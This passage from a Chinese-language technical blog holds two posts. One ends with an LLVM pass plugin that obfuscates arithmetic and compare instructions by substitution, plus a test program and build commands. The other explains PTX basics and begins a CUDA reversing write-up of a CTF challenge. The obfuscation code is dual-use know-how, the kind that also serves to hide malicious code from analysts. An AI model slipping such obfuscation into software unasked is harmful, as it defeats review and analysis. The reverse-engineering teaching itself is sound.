的无用操作</span><br>        Value *finalResult = builder.<span class="hljs-built_in">CreateXor</span>(addResult, ConstantInt::<span class="hljs-built_in">get</span>(op1-&gt;<span class="hljs-built_in">getType</span>(), <span class="hljs-number">0</span>), <span class="hljs-string">&quot;add_subst&quot;</span>);<br><br>        addInst-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(finalResult);<br>        <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Replaced ADD instruction\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// a - b =&gt; a + ()</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">substituteSub</span><span class="hljs-params">(BinaryOperator *subInst)</span></span><br><span class="hljs-function">    </span>&#123;<br>        IRBuilder&lt;&gt; <span class="hljs-built_in">builder</span>(subInst);<br>        Value *op1 = subInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>);<br>        Value *op2 = subInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//~b</span><br>        Value *notOp2 = builder.<span class="hljs-built_in">CreateNot</span>(op2, <span class="hljs-string">&quot;not_tmp&quot;</span>);<br>        <span class="hljs-comment">//~b + 1</span><br>        Value *negOp2 = builder.<span class="hljs-built_in">CreateAdd</span>(notOp2,<br>                                          ConstantInt::<span class="hljs-built_in">get</span>(op2-&gt;<span class="hljs-built_in">getType</span>(), <span class="hljs-number">1</span>), <span class="hljs-string">&quot;neg_tmp&quot;</span>);<br>        <span class="hljs-comment">// a + (~b + 1)</span><br>        Value *finalResult = builder.<span class="hljs-built_in">CreateAdd</span>(op1, negOp2, <span class="hljs-string">&quot;final_tmp&quot;</span>);<br><br>        subInst-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(finalResult);<br>        <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Replaced SUB instruction\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// a ^ b =&gt; (a | b) - (a &amp; b)</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">substituteXor</span><span class="hljs-params">(BinaryOperator *xorInst)</span></span><br><span class="hljs-function">    </span>&#123;<br>        IRBuilder&lt;&gt; <span class="hljs-built_in">builder</span>(xorInst);<br>        Value *op1 = xorInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>);<br>        Value *op2 = xorInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// a | b</span><br>        Value *orResult = builder.<span class="hljs-built_in">CreateOr</span>(op1, op2, <span class="hljs-string">&quot;or_tmp&quot;</span>);<br>        <span class="hljs-comment">// a &amp; b</span><br>        Value *andResult = builder.<span class="hljs-built_in">CreateAnd</span>(op1, op2, <span class="hljs-string">&quot;and_tmp&quot;</span>);<br>        <span class="hljs-comment">// (a | b) - (a &amp; b)</span><br>        Value *finalResult = builder.<span class="hljs-built_in">CreateSub</span>(orResult, andResult, <span class="hljs-string">&quot;final_tmp&quot;</span>);<br><br>        xorInst-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(finalResult);<br>        <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Replaced XOR instruction\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// a * b =&gt;</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">substituteMul</span><span class="hljs-params">(BinaryOperator *mulInst)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isa</span>&lt;ConstantInt&gt;(mulInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>)))<br>        &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        ConstantInt *constOp = <span class="hljs-built_in">cast</span>&lt;ConstantInt&gt;(mulInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">uint64_t</span> multiplier = constOp-&gt;<span class="hljs-built_in">getZExtValue</span>();<br><br>        <span class="hljs-keyword">if</span> (multiplier &gt; <span class="hljs-number">0</span> &amp;&amp; (multiplier &amp; (multiplier - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>)<br>        &#123;<br>            IRBuilder&lt;&gt; <span class="hljs-built_in">builder</span>(mulInst);<br>            Value *op1 = mulInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-type">unsigned</span> shiftAmount = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">uint64_t</span> temp = multiplier;<br>            <span class="hljs-keyword">while</span> (temp &gt; <span class="hljs-number">1</span>)<br>            &#123;<br>                temp &gt;&gt;= <span class="hljs-number">1</span>;<br>                shiftAmount++;<br>            &#125;<br><br>            Value *shiftResult = builder.<span class="hljs-built_in">CreateShl</span>(op1, shiftAmount, <span class="hljs-string">&quot;mul_subst&quot;</span>);<br>            mulInst-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(shiftResult);<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Replaced MUL instruction\n&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// cmp 混淆</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">substituteICmp</span><span class="hljs-params">(ICmpInst *cmpInst)</span></span><br><span class="hljs-function">    </span>&#123;<br>        IRBuilder&lt;&gt; <span class="hljs-built_in">builder</span>(cmpInst);<br>        Value *op1 = cmpInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">0</span>);<br>        Value *op2 = cmpInst-&gt;<span class="hljs-built_in">getOperand</span>(<span class="hljs-number">1</span>);<br><br>        ICmpInst::Predicate pred = cmpInst-&gt;<span class="hljs-built_in">getPredicate</span>();<br><br>        <span class="hljs-comment">// a == b =&gt; (a ^ b) == 0</span><br>        <span class="hljs-keyword">if</span> (pred == ICmpInst::ICMP_EQ)<br>        &#123;<br>            Value *xorResult = builder.<span class="hljs-built_in">CreateXor</span>(op1, op2, <span class="hljs-string">&quot;xor_tmp&quot;</span>);<br>            Value *zero = ConstantInt::<span class="hljs-built_in">get</span>(op1-&gt;<span class="hljs-built_in">getType</span>(), <span class="hljs-number">0</span>);<br>            Value *newCmp = builder.<span class="hljs-built_in">CreateICmpEQ</span>(xorResult, zero, <span class="hljs-string">&quot;eq_subst&quot;</span>);<br><br>            cmpInst-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(newCmp);<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Replace ICMP_EQ instruction\n&quot;</span>;<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">InstructionSubstitutionPass</span>() : <span class="hljs-built_in">rng</span>(std::random_device&#123;&#125;()) &#123;&#125;<br><br>    <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">bool</span> modified = <span class="hljs-literal">false</span>;<br>        std::vector&lt;Instruction *&gt; toReplace;<br><br>        <span class="hljs-keyword">for</span> (BasicBlock &amp;BB : F)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (Instruction &amp;I : BB)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> *binOp = <span class="hljs-built_in">dyn_cast</span>&lt;BinaryOperator&gt;(&amp;I))<br>                &#123;<br>                    <span class="hljs-keyword">switch</span> (binOp-&gt;<span class="hljs-built_in">getOpcode</span>())<br>                    &#123;<br>                    <span class="hljs-keyword">case</span> Instruction::Add:<br>                    <span class="hljs-keyword">case</span> Instruction::Sub:<br>                    <span class="hljs-keyword">case</span> Instruction::Xor:<br>                    <span class="hljs-keyword">case</span> Instruction::Mul:<br>                        toReplace.<span class="hljs-built_in">push_back</span>(&amp;I);<br>                        <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">default</span>:<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> *cmpInst = <span class="hljs-built_in">dyn_cast</span>&lt;ICmpInst&gt;(&amp;I))<br>                &#123;<br>                    toReplace.<span class="hljs-built_in">push_back</span>(&amp;I);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Instruction *inst : toReplace)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> *binOp = <span class="hljs-built_in">dyn_cast</span>&lt;BinaryOperator&gt;(inst))<br>            &#123;<br>                <span class="hljs-keyword">switch</span> (binOp-&gt;<span class="hljs-built_in">getOpcode</span>())<br>                &#123;<br>                <span class="hljs-keyword">case</span> Instruction::Add:<br>                    <span class="hljs-built_in">substituteAdd</span>(binOp);<br>                    modified = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> Instruction::Sub:<br>                    <span class="hljs-built_in">substituteSub</span>(binOp);<br>                    modified = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> Instruction::Xor:<br>                    <span class="hljs-built_in">substituteXor</span>(binOp);<br>                    modified = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> Instruction::Mul:<br>                    <span class="hljs-built_in">substituteMul</span>(binOp);<br>                    modified = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> *cmpInst = <span class="hljs-built_in">dyn_cast</span>&lt;ICmpInst&gt;(inst))<br>            &#123;<br>                <span class="hljs-built_in">substituteICmp</span>(cmpInst);<br>                modified = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Instruction *inst : toReplace)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (inst-&gt;<span class="hljs-built_in">use_empty</span>())<br>            &#123;<br>                inst-&gt;<span class="hljs-built_in">eraseFromParent</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (modified)<br>        &#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;[InstSubst] Modified function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> modified ? PreservedAnalyses::<span class="hljs-built_in">none</span>() : PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> LLVM_ATTRIBUTE_WEAK ::<span class="hljs-function">llvm::PassPluginLibraryInfo <span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        .APIVersion = LLVM_PLUGIN_API_VERSION,<br>        .PluginName = <span class="hljs-string">&quot;InstructionSubstitutionPass&quot;</span>,<br>        .PluginVersion = <span class="hljs-string">&quot;v0.1&quot;</span>,<br>        .RegisterPassBuilderCallbacks = [](PassBuilder &amp;PB)<br>        &#123;<br>            PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>                [](StringRef Name, FunctionPassManager &amp;FPM,<br>                   ArrayRef&lt;PassBuilder::PipelineElement&gt;)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (Name == <span class="hljs-string">&quot;instruction_sub&quot;</span>)<br>                    &#123;<br>                        FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">InstructionSubstitutionPass</span>());<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;);<br>        &#125;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test3.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">calc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">18</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> sum = a + b;<br>    <span class="hljs-type">int</span> diff = a - b;<br>    <span class="hljs-type">int</span> xor_res = diff ^ b;<br>    <span class="hljs-type">int</span> mul_res = xor_res * <span class="hljs-number">4</span>;<br><br>    <span class="hljs-keyword">if</span> (mul_res == c)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">instsub</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> y = <span class="hljs-number">20</span>;<br><br>    <span class="hljs-type">int</span> res = x + y;<br>    res = res - <span class="hljs-number">5</span>;<br>    res = res ^ <span class="hljs-number">15</span>;<br>    res = res * <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d\n&quot;</span>, res);<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">50</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello instruction substitute!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;calc result: %d\n&quot;</span>, calc(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));<br>    instsub();<br>&#125;<br></code></pre></td></tr></table></figure><p>编译 LLVM Pass 插件<br><code>clang++-18 -shared -fPIC </code>llvm-config-19 –cxxflags<code> -o InstructionSubstitutionPass.so sub.cpp</code></p><p>将 C 源码编译为 LLVM IR<br><code>clang -O0 -emit-llvm -c test3.c -o test3.ll</code></p><p>运行自定义 Pass 对 IR 进行转换<br><code>opt -load-pass-plugin=./InstructionSubstitutionPass.so -passes=instruction_sub test3.ll -S -o afterSub_test3.ll</code></p><p>将混淆后的 IR 编译为可执行文件<br><code>clang afterSub_test3.ll -o afterSub_test3</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>llvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cuda 逆向</title>
    <link href="/2025/07/21/cuda/"/>
    <url>/2025/07/21/cuda/</url>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>CUDA (Compute Unified Device Architecture) 是由 NVIDIA 开发的一种并行计算平台和编程模型；它允许软件开发者和研究人员利用 NVIDIA GPU 的强大并行处理能力来加速通用计算任务，而不仅仅局限于图形渲染<br>cuda 逆向本身不难，一般是使用 <code>cuobjump</code> 来获得 ptx 汇编 ，根据汇编理出加密逻辑最后进行解密即可</p><h4 id="PTX-基础知识"><a href="#PTX-基础知识" class="headerlink" title="PTX 基础知识"></a>PTX 基础知识</h4><p><strong>寄存器</strong>：<br><code>%p&lt;N&gt;</code>：谓词寄存器（1 位，用于条件执行）<br><code>%rs&lt;N&gt;</code>：16 位寄存器（例如 %rs1）<br><code>%r&lt;N&gt;</code>：32 位寄存器（例如 %r1）<br><code>%rd&lt;N&gt;</code>：64 位寄存器（例如 %rd1）<br><code>%f&lt;N&gt;</code>：32 位浮点寄存器（例如 %f1）<br><strong>特殊寄存器</strong>：<br><code>%tid.x</code>、<code>%tid.y</code>、<code>%tid.z</code>：线程在其线程块内的 ID<br><code>%ntid.x</code>、<code>%ntid.y</code>、<code>%ntid.z</code>：线程块的维度（每个块的线程数）<br><code>%ctaid.x</code>、<code>%ctaid.y</code>、<code>%ctaid.z</code> ：线程块在网格内的 ID<br><code>%nctaid.x</code>、<code>%nctaid.y</code>、<code>%nctaid.z</code>：网格的维度（网格中的块数）<br><strong>内存空间</strong>：<br><code>.const</code>：常量内存（只读，缓存）<br><code>.global</code>：全局内存（主要的 GPU 内存，所有线程都可访问）<br><code>.param</code>：参数内存（用于内核函数的参数）<br><strong>常见指令</strong>：<br><code>ld</code>：从内存加载数据<br><code>st</code>：将数据存储到内存<br><code>mov</code>：在寄存器之间移动值<br><code>add、sub、mul、shl、shr</code>：加、减、乘、左移、右移<br><code>and、or、xor</code>：按位与、按位或、异或<br><code>setp</code>：根据比较结果设置谓词寄存器<br><strong><code>bra</code>：分支（无条件跳转）</strong> (jmp)<br><code>@%pX bra</code>：条件分支（如果谓词 %pX 为真，则跳转）<br><code>ret</code>：从内核返回<br><strong><code>bar.sync</code>：同步线程块内的所有线程</strong><br><code>cvta.to.global.u64</code>：将地址转换为全局内存地址<br><code>cvt</code>：数据类型转换<br><code>fma.rn.f32</code>：融合乘加（float32，四舍五入到最近的）<br><strong><code>mad.lo.s32</code>：乘加（有符号 32 位，结果的低 32 位）</strong> (a * b + c)<br><code>mul.wide.u32</code>：乘法（无符号 32 位，生成 64 位结果）</p><h3 id="ACTF-2025-Deeptx"><a href="#ACTF-2025-Deeptx" class="headerlink" title="ACTF 2025 Deeptx"></a>ACTF 2025 Deeptx</h3><p>附件先扔 ida，看到 main<br><img src="/../images/cuda/a1.png"><br>主要步骤:打开并验证 bmp 图像 -&gt; 读取调色板和像素数据 -&gt; 将 S-box、T-box 和 motion 表复制到 GPU 常量内存 -&gt; 调用三层 cuda 处理(Layer1、Layer2、Layer3) -&gt; 保存处理后的图像</p><p>使用 cuobjdump.exe,<code>cuobjdump --dump-ptx quiz</code>， dump 出汇编</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.<span class="hljs-type">const</span> .align <span class="hljs-number">1</span> .b8 cuda_sbox[<span class="hljs-number">256</span>]; <br>.<span class="hljs-type">const</span> .align <span class="hljs-number">1</span> .b8 cuda_tbox[<span class="hljs-number">256</span>]; <br>.<span class="hljs-type">const</span> .align <span class="hljs-number">4</span> .b8 cuda_motion[<span class="hljs-number">1024</span>]; <br><br>.visible .entry _Z6Layer1PhS_(  <br>.param .u64 _Z6Layer1PhS__param_0,<br>.param .u64 _Z6Layer1PhS__param_1 <br>)<br>&#123;<br>.reg .pred %p&lt;<span class="hljs-number">6</span>&gt;;<br>.reg .b16 %rs&lt;<span class="hljs-number">2</span>&gt;;<br>.reg .f32 %f&lt;<span class="hljs-number">12</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">23</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">15</span>&gt;;<br><br>ld.param.u64 %rd5, [_Z6Layer1PhS__param_0];<br>ld.param.u64 %rd6, [_Z6Layer1PhS__param_1];<br>mov.u32 %r1, %tid.x;<br>setp.lt.u32 %p1, %r1, <span class="hljs-number">241</span>;<br>mov.u32 %r2, %ctaid.x;<br>setp.lt.u32 %p2, %r2, <span class="hljs-number">241</span>;<br><span class="hljs-keyword">and</span>.pred %p3, %p1, %p2;<br>@%p3 bra $L__BB0_2;<br>bra.uni $L__BB0_1;<br><br>$L__BB0_2:<br>mov.u32 %r3, %ntid.x;<br>cvta.to.global.u64 %rd1, %rd5;<br>mov.f32 %f10, <span class="hljs-number">0</span>f00000000;<br>mov.u32 %r11, <span class="hljs-number">0</span>;<br>mov.u64 %rd8, cuda_motion;<br>mov.u32 %r20, %r11;<br><br>$L__BB0_3:<br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>;<br>add.s32 %r13, %r20, %r2;<br>shl.b32 %r14, %r20, <span class="hljs-number">4</span>;<br>mov.u32 %r15, <span class="hljs-number">240</span>;<br>sub.s32 %r16, %r15, %r14;<br>mad.lo.s32 %r21, %r13, %r3, %r1;<br>mul.wide.u32 %rd7, %r16, <span class="hljs-number">4</span>;<br>add.s64 %rd14, %rd8, %rd7;<br>mov.u32 %r22, %r11;<br><br>$L__BB0_4:<br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd9, %r21;<br>add.s64 %rd10, %rd1, %rd9;<br>ld.global.u8 %rs1, [%rd10];<br>cvt.rn.f<span class="hljs-number">32.</span>u16 %f7, %rs1;<br>ld.<span class="hljs-type">const</span>.f32 %f8, [%rd14];<br>fma.rn.f32 %f10, %f8, %f7, %f10;<br>add.s32 %r21, %r21, <span class="hljs-number">1</span>;<br>add.s64 %rd14, %rd14, <span class="hljs-number">4</span>;<br>add.s32 %r22, %r22, <span class="hljs-number">1</span>;<br>setp.ne.s32 %p4, %r22, <span class="hljs-number">16</span>;<br>@%p4 bra $L__BB0_4;<br><br>add.s32 %r20, %r20, <span class="hljs-number">1</span>;<br>setp.lt.u32 %p5, %r20, <span class="hljs-number">16</span>;<br>@%p5 bra $L__BB0_3;<br>bra.uni $L__BB0_6;<br><br>$L__BB0_1:<br>mov.f32 %f10, <span class="hljs-number">0</span>f00000000;<br><br>$L__BB0_6:<br>cvt.rzi.u<span class="hljs-number">32.f32</span> %r17, %f10;<br>mov.u32 %r18, %ntid.x;<br>mad.lo.s32 %r19, %r2, %r18, %r1;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd11, %r19;<br>cvta.to.global.u64 %rd12, %rd6;<br>add.s64 %rd13, %rd12, %rd11;<br>st.global.u8 [%rd13], %r17;<br>ret;<br><br>&#125;<br><span class="hljs-comment">//</span><br>.visible .entry _Z6Layer2PhS_(<br>.param .u64 _Z6Layer2PhS__param_0,<br>.param .u64 _Z6Layer2PhS__param_1<br>)<br>&#123;<br>.reg .b16 %rs&lt;<span class="hljs-number">2</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">8</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">14</span>&gt;;<br><br><br>ld.param.u64 %rd1, [_Z6Layer2PhS__param_0];<br>ld.param.u64 %rd2, 